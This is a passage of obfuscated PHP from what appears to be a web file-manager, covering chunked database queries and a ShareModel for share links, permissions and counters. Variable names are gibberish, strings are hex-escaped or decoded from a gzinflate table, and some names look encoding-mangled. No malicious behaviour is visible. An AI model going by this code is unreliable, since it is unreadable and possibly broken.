$ÅÔÍœŠî[$¨ëÁËÕä] = $„»ıƒ–—[483] . $Ûû¯¨ÅÍ . $„»ıƒ–—[484] . $íûì¼Ô . $„»ıƒ–—[485]; $¨ëÁËÕä++; continue; } if (is_array($íĞ²ÙÕñ)) { $à¶ñœÍ = is_string($­™…¸ÖÛ) ? $­™…¸ÖÛ : $à¶ñœÍ; $íĞ²ÙÕñ = $this->parseWhereLike($íĞ²ÙÕñ, $à¶ñœÍ, !0, $ø½©«‹Ç); } if (is_numeric($­™…¸ÖÛ)) { $ÅÔÍœŠî[$¨ëÁËÕä] = $íĞ²ÙÕñ; $¨ëÁËÕä++; } else { $ÅÔÍœŠî[$­™…¸ÖÛ] = $íĞ²ÙÕñ; } } if ($ø½©«‹Ç && !$çèö«§ˆ) { } return $ÅÔÍœŠî; } private $addTaskStatus = false; private $addTaskData = array(); public function addTaskStart() { $this->addTaskStatus = !0; $this->addTaskData = array(); } public function addTaskEnd() { if (!$this->addTaskStatus) { return; } $this->addAll($this->addTaskData); $this->addTaskStatus = !1; $this->addTaskData = array(); } public function select($ìóíÃ¬¥ = array()) { $¤äáÌìÇ =& $_SERVER[”øäÃÍª]; $¢Æ Ùô = self::SQL_WHERE_IN_CHUNK; $”ƒŒÒ§Â = $this->optionsValue(); $‹ƒè˜ûı = $this->findWhereField($”ƒŒÒ§Â); if (!$‹ƒè˜ûı || isset($”ƒŒÒ§Â[$¤äáÌìÇ[368]]) || isset($”ƒŒÒ§Â[$¤äáÌìÇ[428]])) { return parent::select($ìóíÃ¬¥); } $£ ãßùú = $”ƒŒÒ§Â[$¤äáÌìÇ[353]][$‹ƒè˜ûı][1]; $£ ãßùú = is_array($£ ãßùú) ? $£ ãßùú : array(); $Ùà’¾™ö = null; for ($¾¹Æ¹Ú = 0; $¾¹Æ¹Ú < count($£ ãßùú); $¾¹Æ¹Ú += $¢Æ Ùô) { $ˆÛŞ ¾² = array_slice($£ ãßùú, $¾¹Æ¹Ú, $¢Æ Ùô); if (!is_array($ˆÛŞ ¾²) || count($ˆÛŞ ¾²) == 0) { break; } $”ƒŒÒ§Â[$¤äáÌìÇ[353]][$‹ƒè˜ûı][1] = $ˆÛŞ ¾²; $this->optionsValue($”ƒŒÒ§Â); $©Æ¶°Ì­ = parent::select($ìóíÃ¬¥); if (!$©Æ¶°Ì­) { continue; } $Ùà’¾™ö = is_array($Ùà’¾™ö) ? $Ùà’¾™ö : array(); $Ùà’¾™ö = array_merge($Ùà’¾™ö, $©Æ¶°Ì­); } return $Ùà’¾™ö; } public function delete($ÃÂîË¹Û = array()) { $‚ˆ¯›¯Ä =& $_SERVER[”øäÃÍª]; $¢„Õ‚¿ = self::SQL_WHERE_IN_CHUNK; $§Ã˜´© = $this->optionsValue(); $öü´´ÁÀ = $this->findWhereField($§Ã˜´©); if (!$öü´´ÁÀ) { return parent::delete($ÃÂîË¹Û); } $ÛØå¨Öß = 0; $³½Òèœ½ = $§Ã˜´©[$‚ˆ¯›¯Ä[353]][$öü´´ÁÀ][1]; $³½Òèœ½ = is_array($³½Òèœ½) ? $³½Òèœ½ : array(); for ($ÁÀœ³À° = 0; $ÁÀœ³À° < count($³½Òèœ½); $ÁÀœ³À° += $¢„Õ‚¿) { $Í‹ß‚Š‹ = array_slice($³½Òèœ½, $ÁÀœ³À°, $¢„Õ‚¿); if (!is_array($Í‹ß‚Š‹) || count($Í‹ß‚Š‹) == 0) { break; } $§Ã˜´©[$‚ˆ¯›¯Ä[353]][$öü´´ÁÀ][1] = $Í‹ß‚Š‹; $this->optionsValue($§Ã˜´©); $ÛØå¨Öß += parent::delete($ÃÂîË¹Û); } return $ÛØå¨Öß; } private function findWhereField($¼Ó÷Á¼) { $”¸İéşì =& $_SERVER[”øäÃÍª]; $«ÕîØ–¦ = self::SQL_WHERE_IN_CHUNK; if (!is_array($¼Ó÷Á¼) || !is_array($¼Ó÷Á¼[$”¸İéşì[353]])) { return !1; } foreach ($¼Ó÷Á¼[$”¸İéşì[353]] as $éÆÌ×ñ => $¡­–­Îğ) { if (is_array($¡­–­Îğ) && isset($¡­–­Îğ[0]) && is_string($¡­–­Îğ[0]) && strtolower($¡­–­Îğ[0]) == $”¸İéşì[7] && is_array($¡­–­Îğ[1]) && count($¡­–­Îğ[1]) > $«ÕîØ–¦) { ignore_timeout(); return $éÆÌ×ñ; } } return !1; } public function setMasterDB($ğÖÌ¤»ı = true) { think_config($_SERVER[”øäÃÍª][486], $ğÖÌ¤»ı); } } goto bÎ›ê²…Úô; AÂãöÕ‰ôË: define($_SERVER[”øäÃÍª][0], $_SERVER[”øäÃÍª][1]); $_SERVER[–¥ˆîÀ°] = explode($_SERVER[”øäÃÍª][2], gzinflate(substr($_SERVER[”øäÃÍª][3], 10, -8))); function binCheckEq($€Û¦õ‘Ÿ, $‘Âáòû) { return $€Û¦õ‘Ÿ == $‘Âáòû; } goto EàÏ¼Íõ¤; fôùÒÃ±››: class ShareModel extends ModelBase { protected $tableName = "\x73\x68\x61\x72\145"; protected $dataAuto = array(array("\155\157\144\x69\x66\171\124\151\155\145", "\x74\151\x6d\145", "\x69\156\163\x65\162\x74\x2c\x75\x70\x64\141\164\x65", "\x66\165\156\143\x74\151\157\156"), array("\x63\x72\145\141\164\145\124\x69\155\x65", "\164\151\155\145", "\151\x6e\x73\145\x72\x74", "\x66\x75\156\143\x74\x69\157\x6e"), array("\x6f\x70\164\x69\157\156\x73", '', "\x69\x6e\x73\145\162\164\54\x75\160\x64\x61\x74\145\54\163\x65\x6c\x65\x63\x74", "\x6a\x73\157\x6e")); private $fieldList = "\52"; protected function cacheFunctionAlias($îÀíåë) { $ùÄı°È =& $_SERVER[”øäÃÍª]; return array($ùÄı°È[2279] => array(USER_ID, $ùÄı°È[2280]), $ùÄı°È[2281] => array($îÀíåë[0], $ùÄı°È[2282])); } protected function ___listSimple() { $çë§†÷ = $this->field($this->fieldList)->where(array($_SERVER[”øäÃÍª][1548] => USER_ID))->select(); return $çë§†÷ ? $çë§†÷ : array(); } protected function ___getInfoShare($çîá²­Ú) { return $this->_getShareInfo(array($_SERVER[”øäÃÍª][695] => $çîá²­Ú), !1); } protected function getInfo($ĞãÜÈ˜¯) { $™¼¡¸ª• = $this->getInfoShare($ĞãÜÈ˜¯); return $this->shareSourceInfo($™¼¡¸ª•); } public function getInfoByHash($”Æö¢Ø) { return $this->_getShareInfo(array($_SERVER[”øäÃÍª][1510] => $”Æö¢Ø)); } public function getInfoByPath($Ğé­‡à‰) { $±üÏÂÕ‰ =& $_SERVER[”øäÃÍª]; $±ş‚€À = array($±üÏÂÕ‰[1548] => USER_ID, $±üÏÂÕ‰[191] => $Ğé­‡à‰); return $this->_getShareInfo($±ş‚€À); } public function getInfoBySourcePath($Óæ§ÁçÇ) { $óÅÌæœ =& $_SERVER[”øäÃÍª]; $ÂüÑ§ö˜ = array($óÅÌæœ[1548] => USER_ID, $óÅÌæœ[591] => $Óæ§ÁçÇ); return $this->_getShareInfo($ÂüÑ§ö˜); } private function _getShareInfo($Æ½‰˜¥Û, $ÏÀª×ÈØ = true) { $ØòÊı =& $_SERVER[”øäÃÍª]; $äÔ­â…Ë = $this->where($Æ½‰˜¥Û)->find(); if (!$äÔ­â…Ë) { return !1; } if (!is_array($äÔ­â…Ë[$ØòÊı[588]])) { $äÔ­â…Ë[$ØòÊı[588]] = array(); } $Æ½‰˜¥Û = array($ØòÊı[695] => $äÔ­â…Ë[$ØòÊı[695]]); $ÌÀÌ¬â† = $ØòÊı[2283]; $äÔ­â…Ë[$ØòÊı[1506]] = Model($ØòÊı[696])->order($ØòÊı[487])->field($ÌÀÌ¬â†)->where($Æ½‰˜¥Û)->select(); if (!$ÏÀª×ÈØ) { return $äÔ­â…Ë; } return $this->shareSourceInfo($äÔ­â…Ë); } private function shareSourceInfo($ÒøÏ¨ÏŞ) { $øø…à¾å =& $_SERVER[”øäÃÍª]; if (!is_array($ÒøÏ¨ÏŞ)) { return $ÒøÏ¨ÏŞ; } if ($ÒøÏ¨ÏŞ[$øø…à¾å[191]] == $øø…à¾å[228]) { $ÒøÏ¨ÏŞ[$øø…à¾å[90]] = IO::info($ÒøÏ¨ÏŞ[$øø…à¾å[591]]); } else { $ÒøÏ¨ÏŞ[$øø…à¾å[90]] = Model($øø…à¾å[1488])->pathInfo($ÒøÏ¨ÏŞ[$øø…à¾å[191]]); } return $ÒøÏ¨ÏŞ; } protected function getInfoAuth($ƒ›ğÂĞ) { $çñËóùÎ =& $_SERVER[”øäÃÍª]; $å±íİ÷å = $this->getInfo($ƒ›ğÂĞ); if ($å±íİ÷å[$çñËóùÎ[1548]] == USER_ID) { $å±íİ÷å[$çñËóùÎ[510]] = $å±íİ÷å[$çñËóùÎ[90]][$çñËóùÎ[510]]; } else { $å±íİ÷å[$çñËóùÎ[510]] = Model($çñËóùÎ[595])->authMake($å±íİ÷å[$çñËóùÎ[1506]]); } return $å±íİ÷å; } protected function listData($Ã“ì›Íö = null, $åô‚¢ ı = 300) { $Àˆà×Ì =& $_SERVER[”øäÃÍª]; $â·şá³Ê = array(array($Àˆà×Ì[586] => array($Àˆà×Ì[1134], 0), $Àˆà×Ì[693] => array($Àˆà×Ì[1134], 0), $Àˆà×Ì[2284] => $Àˆà×Ì[2240])); if ($Ã“ì›Íö == $Àˆà×Ì[2285]) { $â·şá³Ê = array($Àˆà×Ì[586] => 1); } else { if ($Ã“ì›Íö == $Àˆà×Ì[1299]) { $â·şá³Ê = array($Àˆà×Ì[693] => 1); } } $â·şá³Ê[$Àˆà×Ì[1548]] = USER_ID; $…‡µÎÔş = $this->where($â·şá³Ê)->selectPage($åô‚¢ ı); return $…‡µÎÔş; } protected function listToMe($ÎûÛÊõ = 300) { $‹à–÷»ß =& $_SERVER[”øäÃÍª]; $¨·ÕÒõ± = Model($‹à–÷»ß[2286])->userGroupParents(USER_ID); $×˜„ Øí = array($‹à–÷»ß[678] => SourceModel::TYPE_USER, $‹à–÷»ß[597] => USER_ID); if ($¨·ÕÒõ±) { $×˜„ Øí = array(array($‹à–÷»ß[678] => SourceModel::TYPE_USER, $‹à–÷»ß[597] => USER_ID), array($‹à–÷»ß[678] => SourceModel::TYPE_GROUP, $‹à–÷»ß[597] => array($‹à–÷»ß[7], $¨·ÕÒõ±)), $‹à–÷»ß[2284] => $‹à–÷»ß[2240]); } $•±ÓÌ°ı = Model($‹à–÷»ß[696])->field($‹à–÷»ß[695])->where($×˜„ Øí)->select(); $•±ÓÌ°ı = array_unique(array_to_keyvalue($•±ÓÌ°ı, $‹à–÷»ß[12], $‹à–÷»ß[695])); $×˜„ Øí = array($‹à–÷»ß[695] => array($‹à–÷»ß[515], $•±ÓÌ°ı)); if (!$•±ÓÌ°ı) { return array($‹à–÷»ß[446] => array(), $‹à–÷»ß[443] => array($‹à–÷»ß[2287] => 0, $‹à–÷»ß[428] => 1)); } $œèòº¤ß = Model($‹à–÷»ß[696])->where($×˜„ Øí)->select(); $œèòº¤ß = array_to_keyvalue_group($œèòº¤ß, $‹à–÷»ß[695]); $ê³øôï¤ = $‹à–÷»ß[2288]; $¸ ¼¨‘˜ = $this->field($ê³øôï¤)->where($×˜„ Øí)->selectPage($ÎûÛÊõ); foreach ($¸ ¼¨‘˜[$‹à–÷»ß[446]] as $Şè”ŒÁ„ => &$ü·¥Öœ) { $ü·¥Öœ[$‹à–÷»ß[1506]] = $œèòº¤ß[$ü·¥Öœ[$‹à–÷»ß[695]]]; } unset($ü·¥Öœ); return $¸ ¼¨‘˜; } protected function shareAdd($¯àÆĞá, $¯ÑÙÆş) { $ñå¦¨Ú÷ =& $_SERVER[”øäÃÍª]; $ŒæôÌçİ = $this->_addShareData($¯àÆĞá, $¯ÑÙÆş); if (!empty($¯ÑÙÆş[$ñå¦¨Ú÷[2289]])) { $this->_shareAuthSet($ŒæôÌçİ, $¯ÑÙÆş[$ñå¦¨Ú÷[2289]]); } $this->shareEventAdd($¯àÆĞá, $¯ÑÙÆş, $ñå¦¨Ú÷[2290]); return $ŒæôÌçİ; } protected function shareAddSystem($è­ÅŞÎï, $°…”õÙÈ) { $­îö¾ÈÆ =& $_SERVER[”øäÃÍª]; $Ãù€¶‹ = $this->_addShareData($è­ÅŞÎï, $°…”õÙÈ, $­îö¾ÈÆ[189]); $this->_shareAuthSet($Ãù€¶‹, $°…”õÙÈ[$­îö¾ÈÆ[2289]]); return $Ãù€¶‹; } private function shareEventAdd($·ù¾¿Õì, $ŸÁ÷ş“ª, $”Ì©Ş – = "\141\x64\144") { $º£±¸°Œ =& $_SERVER[”øäÃÍª]; if (!$·ù¾¿Õì || $·ù¾¿Õì == $º£±¸°Œ[228]) { return; } if ($”Ì©Ş – == $º£±¸°Œ[2290]) { if ($ŸÁ÷ş“ª[$º£±¸°Œ[586]] == $º£±¸°Œ[91]) { Model($º£±¸°Œ[663])->eventShare($·ù¾¿Õì, $º£±¸°Œ[2291]); } if ($ŸÁ÷ş“ª[$º£±¸°Œ[693]] == $º£±¸°Œ[91]) { Model($º£±¸°Œ[663])->eventShare($·ù¾¿Õì, $º£±¸°Œ[2292]); } return; } $é×Š©Ê = $this->getInfoByPath($·ù¾¿Õì); $øŠôÚô² = $º£±¸°Œ[2293]; if ($é×Š©Ê[$º£±¸°Œ[586]] == $º£±¸°Œ[228] && $ŸÁ÷ş“ª[$º£±¸°Œ[586]] == $º£±¸°Œ[91]) { $øŠôÚô² = $º£±¸°Œ[2291]; } if ($é×Š©Ê[$º£±¸°Œ[586]] == $º£±¸°Œ[91] && $ŸÁ÷ş“ª[$º£±¸°Œ[586]] == $º£±¸°Œ[228]) { $øŠôÚô² = $º£±¸°Œ[2294]; } if ($é×Š©Ê[$º£±¸°Œ[693]] == $º£±¸°Œ[228] && $ŸÁ÷ş“ª[$º£±¸°Œ[693]] == $º£±¸°Œ[91]) { $øŠôÚô² = $º£±¸°Œ[2292]; } if ($é×Š©Ê[$º£±¸°Œ[693]] == $º£±¸°Œ[91] && $ŸÁ÷ş“ª[$º£±¸°Œ[693]] == $º£±¸°Œ[228]) { $øŠôÚô² = $º£±¸°Œ[2295]; } Model($º£±¸°Œ[663])->eventShare($·ù¾¿Õì, $øŠôÚô²); return; } private function _addShareData($Ç¡œœ, $‘İ³üİ = array(), $Ô×°œØ‘ = false) { $¤íÍİá =& $_SERVER[”øäÃÍª]; $¨–ß¦Öå = $Ô×°œØ‘ == $¤íÍİá[189] ? 0 : USER_ID; $·¥¯à– = array($¤íÍİá[514] => $Ç¡œœ, $¤íÍİá[1925] => $¨–ß¦Öå); if ($Ç¡œœ == 0) { $·¥¯à– = array($¤íÍİá[2296] => $‘İ³üİ[$¤íÍİá[591]], $¤íÍİá[1925] => $¨–ß¦Öå); } if ($â€ïÓ¯§ = $this->where($·¥¯à–)->find()) { return $â€ïÓ¯§[$¤íÍİá[695]]; } if ($Ç¡œœ == 0) { $³ÆÍÒç· = array($¤íÍİá[32] => get_path_this($‘İ³üİ[$¤íÍİá[87]])); } else { $³ÆÍÒç· = Model($¤íÍİá[941])->sourceInfo($Ç¡œœ); if (!$³ÆÍÒç·) { return !1; } } if (!$‘İ³üİ[$¤íÍİá[1819]]) { $‘İ³üİ[$¤íÍİá[1819]] = $³ÆÍÒç·[$¤íÍİá[32]]; } $®¥ƒşÜ² = array($¤íÍİá[1925] => $¨–ß¦Öå, $¤íÍİá[514] => $Ç¡œœ, $¤íÍİá[1819] => $¤íÍİá[12], $¤íÍİá[586] => 0, $¤íÍİá[693] => 0, $¤íÍİá[591] => $¤íÍİá[12], $¤íÍİá[382] => $¤íÍİá[12], $¤íÍİá[1008] => $¤íÍİá[12], $¤íÍİá[2297] => 0, $¤íÍİá[2298] => 0, $¤íÍİá[871] => 0, $¤íÍİá[588] => $¤íÍİá[12], $¤íÍİá[1510] => $¤íÍİá[12]); $»¤Ç¶˜æ = explode($¤íÍİá[50], $¤íÍİá[2299]); foreach ($»¤Ç¶˜æ as $ÆË‹šó) { if (!isset($‘İ³üİ[$ÆË‹šó])) { continue; } $®¥ƒşÜ²[$ÆË‹šó] = $‘İ³üİ[$ÆË‹šó]; } $Ò®İ•Íà = $this->add($®¥ƒşÜ²); $ìµ¸ö‰ = array($¤íÍİá[1510] => short_id($Ò®İ•Íà)); if ($this->where($ìµ¸ö‰)->find()) { $ìµ¸ö‰[$¤íÍİá[1510]] .= $¤íÍİá[476] . rand_string(2, 3); } $this->where(array($¤íÍİá[2300] => $Ò®İ•Íà))->save($ìµ¸ö‰); return $Ò®İ•Íà; } private function _shareAuthSet($ƒÂÒÏÉ, $ÒÈ‰üæú) { $€¤´§à· =& $_SERVER[”øäÃÍª]; if (!is_array($ÒÈ‰üæú)) { return !1; } $¶ˆšüÕ© = Model($€¤´§à·[2249]); $¶ˆšüÕ©->where(array($€¤´§à·[695] => $ƒÂÒÏÉ))->delete(); $Øì€ˆ¢š = array(); foreach ($ÒÈ‰üæú as $Š®õŸàÈ) { $Ú„¬åŞ = SourceModel::TYPE_USER; if ($Š®õŸàÈ[$€¤´§à·[188]] == SourceModel::TYPE_GROUP) { $Ú„¬åŞ = SourceModel::TYPE_GROUP; } $¬×½¢ = array($€¤´§à·[695] => $ƒÂÒÏÉ, $€¤´§à·[188] => $Ú„¬åŞ, $€¤´§à·[597] => intval($Š®õŸàÈ[$€¤´§à·[597]]), $€¤´§à·[1595] => 0, $€¤´§à·[2301] => -1); if ($Š®õŸàÈ[$€¤´§à·[1595]]) { $¬×½¢[$€¤´§à·[1595]] = $Š®õŸàÈ[$€¤´§à·[1595]]; } else { if ($Š®õŸàÈ[$€¤´§à·[2301]]) { $¬×½¢[$€¤´§à·[2301]] = $Š®õŸàÈ[$€¤´§à·[2301]]; } } $Øì€ˆ¢š[] = $¬×½¢; } return $¶ˆšüÕ©->addAll($Øì€ˆ¢š, array(), !0); } public function numViewAdd($Ğœã°ñÉ) { $ÙÂ¦ö© =& $_SERVER[”øäÃÍª]; $ô‹‘¬Œæ = array($ÙÂ¦ö©[2300] => $Ğœã°ñÉ); $this->where($ô‹‘¬Œæ)->setAdd($ÙÂ¦ö©[2297]); } public function numDownloadAdd($Ô‹Å‘Ê‚) { $á™†ÀÖ  =& $_SERVER[”øäÃÍª]; $Õ˜èˆ¾á = array($á™†ÀÖ [2300] => $Ô‹Å‘Ê‚); $this->where($Õ˜èˆ¾á)->setAdd($á™†ÀÖ [2298]); } protected function shareEdit($Ì´ •Ê±, $·‰ÀêÕË) { $×ÒğçâÍ =& $_SERVER[”øäÃÍª]; $çàãßÆ = $this->getInfo($Ì´ •Ê±); if (!$çàãßÆ) { return !1; } if ($·‰ÀêÕË[$×ÒğçâÍ[1510]] && $·‰ÀêÕË[$×ÒğçâÍ[586]] == $×ÒğçâÍ[91]) { if ($·‰ÀêÕË[$×ÒğçâÍ[1510]] == $çàãßÆ[$×ÒğçâÍ[1510]]) { unset($·‰ÀêÕË[$×ÒğçâÍ[1510]]); } if ($·‰ÀêÕË[$×ÒğçâÍ[1510]]) { $¦¶¦»àÈ = $this->where(array($×ÒğçâÍ[2302] => $·‰ÀêÕË[$×ÒğçâÍ[1510]]))->find(); if ($¦¶¦»àÈ) { return !1; } if (!is_array($·‰ÀêÕË[$×ÒğçâÍ[588]])) { $·‰ÀêÕË[$×ÒğçâÍ[588]] = is_array($çàãßÆ[$×ÒğçâÍ[588]]) ? $çàãßÆ[$×ÒğçâÍ[588]] : array(); } if (!$·‰ÀêÕË[$×ÒğçâÍ[588]][$×ÒğçâÍ[2303]]) { $·‰ÀêÕË[$×ÒğçâÍ[588]][$×ÒğçâÍ[2303]] = $çàãßÆ[$×ÒğçâÍ[1510]]; $·‰ÀêÕË[$×ÒğçâÍ[588]][$×ÒğçâÍ[2304]] = $×ÒğçâÍ[91]; } } } $this->_checkLinkShare($·‰ÀêÕË, $çàãßÆ); $ìÛÏç¢¡ = array(); $å¸ğŸ…È = explode($×ÒğçâÍ[50], $×ÒğçâÍ[2305]); foreach ($å¸ğŸ…È as $ª†ö…ç) { if (!array_key_exists($ª†ö…ç, $·‰ÀêÕË)) { continue; } $ìÛÏç¢¡[$ª†ö…ç] = $·‰ÀêÕË[$ª†ö…ç]; } $this->shareEventAdd($çàãßÆ[$×ÒğçâÍ[191]], $·‰ÀêÕË, $×ÒğçâÍ[1517]); $this->where(array($×ÒğçâÍ[2300] => $Ì´ •Ê±))->save($ìÛÏç¢¡); if (isset($·‰ÀêÕË[$×ÒğçâÍ[2289]])) { $this->_shareAuthSet($Ì´ •Ê±, $·‰ÀêÕË[$×ÒğçâÍ[2289]]); } return !0; } private function _checkLinkShare($ÈÜ±¡ê‘, $Å¦ªºø) { $ç×˜È†è =& $_SERVER[”øäÃÍª]; if ($ÈÜ±¡ê‘[$ç×˜È†è[586]] != $ç×˜È†è[91]) { return; } $š—¢ª¸  = $Å¦ªºø[$ç×˜È†è[90]][$ç×˜È†è[191]]; if ($Å¦ªºø[$ç×˜È†è[90]][$ç×˜È†è[33]] != $ç×˜È†è[230]) { $Ï•ÈÄóÒ = $this->_folderReport($š—¢ª¸ ); if (!$Ï•ÈÄóÒ) { return; } show_json(LNG($ç×˜È†è[2306]) . $ç×˜È†è[2307] . $Ï•ÈÄóÒ, !1); } $üê…«¹ = Model($ç×˜È†è[941])->fileInfoGet($Å¦ªºø[$ç×˜È†è[90]][$ç×˜È†è[191]]); if (!$üê…«¹) { return; } $£·ğ¨·½ = $this->shareFileMeta($üê…«¹[$ç×˜È†è[565]]); if (isset($£·ğ¨·½[$ç×˜È†è[451]]) && $£·ğ¨·½[$ç×˜È†è[451]] == $ç×˜È†è[91]) { show_json(LNG($ç×˜È†è[2308]), !1); } } private function _folderReport($œ•ĞÕºÚ) { $ÖŠáÖ‘ =& $_SERVER[”øäÃÍª]; $ÔÎ™öæÊ = array($ÖŠáÖ‘[565] => array($ÖŠáÖ‘[1134], 0), $ÖŠáÖ‘[859] => 3); $ÉÒÎó = Model($ÖŠáÖ‘[2309])->where($ÔÎ™öæÊ)->field($ÖŠáÖ‘[565])->select(); if (!$ÉÒÎó) { return !1; } $ÉÒÎó = array_to_keyvalue($ÉÒÎó, $ÖŠáÖ‘[12], $ÖŠáÖ‘[565]); $ÀçÏûÔˆ = $ÖŠáÖ‘[50] . $œ•ĞÕºÚ . $ÖŠáÖ‘[50]; $ÔÎ™öæÊ = array($ÖŠáÖ‘[565] => array($ÖŠáÖ‘[7], $ÉÒÎó), $ÖŠáÖ‘[612] => array($ÖŠáÖ‘[473], "\x25{$ÀçÏûÔˆ}\45"), $ÖŠáÖ‘[528] => 0); $ÉÅ€¯±² = Model($ÖŠáÖ‘[941])->where($ÔÎ™öæÊ)->field($ÖŠáÖ‘[2310])->find(); if (!$ÉÅ€¯±²) { return !1; } $şŠÒ½öñ = substr($ÉÅ€¯±²[$ÖŠáÖ‘[612]], strpos($ÉÅ€¯±²[$ÖŠáÖ‘[612]], $ÀçÏûÔˆ)); $ÔÎ™öæÊ = array($ÖŠáÖ‘[191] => array($ÖŠáÖ‘[7], trim($şŠÒ½öñ, $ÖŠáÖ‘[50]))); $·‘ç­Ì¥ = Model($ÖŠáÖ‘[941])->where($ÔÎ™öæÊ)->field($ÖŠáÖ‘[32])->select(); $‹üô­ó = array_to_keyvalue($·‘ç­Ì¥, $ÖŠáÖ‘[12], $ÖŠáÖ‘[32]); $‹üô­ó[] = $ÉÅ€¯±²[$ÖŠáÖ‘[32]]; return implode($ÖŠáÖ‘[8], $‹üô­ó); } protected function remove($ïÊêÏ µ) { $×ˆµ ê¤ =& $_SERVER[”øäÃÍª]; $ú‰õû¿Ñ = is_array($ïÊêÏ µ) ? $ïÊêÏ µ : array($ïÊêÏ µ); for ($ô¨Ú’±’ = 0; $ô¨Ú’±’ < count($ú‰õû¿Ñ); $ô¨Ú’±’++) { $­¾âê÷Å = $this->getInfo($ú‰õû¿Ñ[$ô¨Ú’±’]); if ($­¾âê÷Å[$×ˆµ ê¤[693]] == $×ˆµ ê¤[91]) { Model($×ˆµ ê¤[663])->eventShare($­¾âê÷Å[$×ˆµ ê¤[191]], $×ˆµ ê¤[2295]); } if ($­¾âê÷Å[$×ˆµ ê¤[586]] == $×ˆµ ê¤[91]) { Model($×ˆµ ê¤[663])->eventShare($­¾âê÷Å[$×ˆµ ê¤[191]], $×ˆµ ê¤[2294]); } } $™òŞ¾õ = array($×ˆµ ê¤[695] => array($×ˆµ ê¤[7], $ú‰õû¿Ñ)); $¬†´Ÿß¬ = $this->where($™òŞ¾õ)->delete(); if ($¬†´Ÿß¬) { Model($×ˆµ ê¤[696])->where($™òŞ¾õ)->delete(); } return $¬†´Ÿß¬; } protected function removeBySource($˜ëöÜí”) { $Ğ„˜™õ =& $_SERVER[”øäÃÍª]; $Ğ‹‡¹®® = array($Ğ„˜™õ[514] => array($Ğ„˜™õ[515], $˜ëöÜí”)); $öº¢•± = $this->field($Ğ„˜™õ[695])->where($Ğ‹‡¹®®)->select(); $øÜ»ıÍ™ = array_to_keyvalue($öº¢•±, $Ğ„˜™õ[12], $Ğ„˜™õ[695]); if (!$øÜ»ıÍ™) { return; } foreach ($öº¢•± as $®Û€Ğ¥) { $this->cacheFunctionClear($Ğ„˜™õ[2311], $®Û€Ğ¥[$Ğ„˜™õ[695]]); } $Ğ‹‡¹®® = array($Ğ„˜™õ[2300] => array($Ğ„˜™õ[515], $øÜ»ıÍ™)); $this->where($Ğ‹‡¹®®)->delete(); Model($Ğ„˜™õ[696])->where($Ğ‹‡¹®®)->delete(); } public function listAll($—ğ÷›Ã) { $˜ÇÁœš„ =& $_SERVER[”øäÃÍª]; $öë×Œ¾¬ = array(); if ($—ğ÷›Ã[$˜ÇÁœš„[1548]]) { $öë×Œ¾¬[$˜ÇÁœš„[1548]] = $—ğ÷›Ã[$˜ÇÁœš„[1548]]; } if ($—ğ÷›Ã[$˜ÇÁœš„[870]]) { $©¶ÏâÓ = $—ğ÷›Ã[$˜ÇÁœš„[871]] ? $—ğ÷›Ã[$˜ÇÁœš„[871]] : strtotime(date($˜ÇÁœš„[2312])); $öë×Œ¾¬[$˜ÇÁœš„[231]] = array($˜ÇÁœš„[408], array($—ğ÷›Ã[$˜ÇÁœš„[870]], $©¶ÏâÓ)); } if ($—ğ÷›Ã[$˜ÇÁœš„[33]]) { $öë×Œ¾¬[$—ğ÷›Ã[$˜ÇÁœš„[33]]] = 1; } else { $öë×Œ¾¬[] = array($˜ÇÁœš„[586] => array($˜ÇÁœš„[1134], 0), $˜ÇÁœš„[693] => array($˜ÇÁœš„[1134], 0), $˜ÇÁœš„[2284] => $˜ÇÁœš„[2240]); } if ($—ğ÷›Ã[$˜ÇÁœš„[2236]]) { $öë×Œ¾¬[] = array($˜ÇÁœš„[1510] => $—ğ÷›Ã[$˜ÇÁœš„[2236]], $˜ÇÁœš„[1819] => array($˜ÇÁœš„[473], "\45{$—ğ÷›Ã[$˜ÇÁœš„[2236]]}\45"), $˜ÇÁœš„[2284] => $˜ÇÁœš„[2240]); } $ÔİãÆÕº = $this->_makeOrder()->where($öë×Œ¾¬)->selectPage(20); if (empty($ÔİãÆÕº[$˜ÇÁœš„[446]])) { return array(); } $this->_listDataApply($ÔİãÆÕº[$˜ÇÁœš„[446]]); return $ÔİãÆÕº; } public function listDataApply($ÇÎ·€Öô) { $this->_listDataApply($ÇÎ·€Öô); return $ÇÎ·€Öô; } private function _listDataApply(&$¤ì¯ª¢ï) { $°İşÌ…” =& $_SERVER[”øäÃÍª]; $ãªÏÌÅƒ = array_to_keyvalue($¤ì¯ª¢ï, $°İşÌ…”[12], $°İşÌ…”[1548]); $©Ì¿åÆÎ = Model($°İşÌ…”[625])->userListInfo(array_unique($ãªÏÌÅƒ)); $÷»ª…Š­ = array_to_keyvalue($¤ì¯ª¢ï, $°İşÌ…”[12], $°İşÌ…”[191]); $«ÊË¦Êø = Model($°İşÌ…”[941])->sourceListInfo($÷»ª…Š­, !0); foreach ($¤ì¯ª¢ï as $ÌŸ•ˆôÆ => &$â¢Â­´ò) { $éà˜¥å³ = $â¢Â­´ò[$°İşÌ…”[1548]]; $â¢Â­´ò[$°İşÌ…”[2313]] = $©Ì¿åÆÎ[$éà˜¥å³] ? $©Ì¿åÆÎ[$éà˜¥å³] : !1; if (!$â¢Â­´ò[$°İşÌ…”[2313]] || $â¢Â­´ò[$°İşÌ…”[2313]][$°İşÌ…”[859]] != $°İşÌ…”[91]) { unset($¤ì¯ª¢ï[$ÌŸ•ˆôÆ]); continue; } $ªÀ¶¿ê = $â¢Â­´ò[$°İşÌ…”[191]]; $â¢Â­´ò[$°İşÌ…”[90]] = $«ÊË¦Êø[$ªÀ¶¿ê] ? $«ÊË¦Êø[$ªÀ¶¿ê] : !1; if ($â¢Â­´ò[$°İşÌ…”[90]][$°İşÌ…”[528]] == $°İşÌ…”[91]) { unset($¤ì¯ª¢ï[$ÌŸ•ˆôÆ]); } if ($â¢Â­´ò[$°İşÌ…”[90]] != $°İşÌ…”[228] && !$â¢Â­´ò[$°İşÌ…”[90]]) { unset($¤ì¯ª¢ï[$ÌŸ•ˆôÆ]); } } unset($â¢Â­´ò); $¤ì¯ª¢ï = array_values($¤ì¯ª¢ï); } private function _makeOrder($ëìƒ“Ó = '') { $ô¸àƒÒã =& $_SERVER[”øäÃÍª]; $Éƒ¶´Ö† = array($ô¸àƒÒã[231], $ô¸àƒÒã[871], $ô¸àƒÒã[2297], $ô¸àƒÒã[2298]); $†ÀóÄåÒ = array($ô¸àƒÒã[545] => $ô¸àƒÒã[546], $ô¸àƒÒã[547] => $ô¸àƒÒã[548]); $œææ‰Ñ = Input::get($ô¸àƒÒã[552], $ô¸àƒÒã[7], $ô¸àƒÒã[520], $Éƒ¶´Ö†); 